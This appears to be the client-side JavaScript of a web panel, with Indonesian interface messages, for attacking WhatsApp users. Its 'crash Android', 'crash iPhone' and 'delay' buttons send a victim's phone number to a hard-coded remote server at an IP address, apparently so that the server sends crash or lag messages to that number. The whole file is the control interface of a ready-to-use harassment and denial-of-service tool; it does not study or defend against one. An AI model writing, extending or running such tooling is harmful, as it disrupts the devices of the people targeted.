document.addEventListener('DOMContentLoaded', () => {
    const targetNumberInput = document.getElementById('targetNumber');
    const crashAndroidBtn = document.getElementById('crashAndroidBtn');
    const crashIphoneBtn = document.getElementById('crashIphoneBtn');
    const delayMentionBtn = document.getElementById('delayMentionBtn');
    const responseMessageDiv = document.getElementById('responseMessage');
    const logoutBtn = document.getElementById('logoutBtn');

    const API_BASE_URL = 'http://206.189.93.164:2011/zuu';

    crashAndroidBtn.addEventListener('click', () => sendAction('fc'));
    crashIphoneBtn.addEventListener('click', () => sendAction('ios'));
    delayMentionBtn.addEventListener('click', () => sendAction('delay'));

    logoutBtn.addEventListener('click', () => {
        sessionStorage.clear(); 
        window.location.href = 'index.html';
    });

    async function sendAction(type) {
        const target = targetNumberInput.value;
        if (!target) {
            showMessage('Nomor target tidak boleh kosong!', 'error');
            return;
        }
        showMessage('Mengirim permintaan...', '');
        try {
            const fullUrl = `${API_BASE_URL}?type=${type}&chatId=${target}@s.whatsapp.net`;
            const response = await fetch(fullUrl);
            const data = await response.json();
            if (data.success) {
                showMessage(data.message || 'berhasil', 'success');
            } else {
                showMessage(data.error || 'Terjadi kesalahan.', 'error');
            }
        } catch (error) {
            showMessage('Gagal terhubung ke server.', 'error');
        }
    }

    function showMessage(message, type) {
        responseMessageDiv.textContent = message;
        responseMessageDiv.className = type;
    }
});
